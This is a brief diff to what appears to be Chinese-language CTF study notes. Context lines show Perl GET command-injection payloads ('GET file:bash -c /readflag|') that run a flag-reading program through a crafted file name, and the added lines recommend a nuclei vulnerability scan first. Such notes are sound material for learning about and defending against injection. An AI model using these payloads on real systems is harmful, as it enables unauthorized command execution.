@@ -62,3 +62,8 @@ GET file:|readflag
 GET file:bash -c /readflag|
 会执行readflag程序命令，并返回程序执行结果到readflag|文件，没有先创建。
 ```
+
+
+^
+## **nuclei扫描**
+有时候可能会出现一些cve漏洞作为前提，这时候可以漏扫一下先。
